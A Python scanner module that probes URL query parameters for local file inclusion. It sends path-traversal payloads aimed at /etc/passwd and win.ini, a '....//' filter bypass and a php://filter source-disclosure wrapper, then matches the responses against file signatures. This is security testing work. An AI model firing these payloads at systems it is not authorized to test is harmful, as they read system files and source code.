import requests
from modules.base_scanner import VulnerabilityScanner
from modules.base_scanner import VulnerabilityScanner
from utils.colors import print_info, print_error, Colors
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class LFIScanner(VulnerabilityScanner):
    def __init__(self, target_url, session):
        super().__init__(target_url, session)
        self.payloads = [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "/etc/passwd",
            "C:\\Windows\\win.ini",
            "....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        self.signatures = [
            "root:x:0:0",
            "[extensions]",
            "for 16-bit app support",
            "<?php"
        ]

    def scan(self):
        print_info(f"Starting LFI Scan on URL parameters...")
        
        # Parse URL to find parameters
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        if not params:
            # print(f"{Colors.INFO} No parameters found in URL to test for LFI.")
            return self.vulnerabilities

        for param_name in params:
            # print(f"{Colors.INFO} Testing parameter '{param_name}' for LFI...")
            
            for payload in self.payloads:
                # Construct new query with payload
                test_params = params.copy()
                test_params[param_name] = payload
                new_query = urlencode(test_params, doseq=True)
                target_url = urlunparse(parsed._replace(query=new_query))
                
                try:
                    response = self.session.get(target_url, timeout=5)
                    
                    for sig in self.signatures:
                        if sig in response.text:
                            print_error(f"Potential LFI Found at {target_url}")
                            self.add_finding(
                                "Local File Inclusion (LFI)",
                                f"LFI payload '{payload}' in parameter '{param_name}' revealed content matching signature '{sig}'",
                                "Critical"
                            )
                            return self.vulnerabilities # Return immediately on critical find
                            
                except requests.RequestException:
                    pass

        return self.vulnerabilities
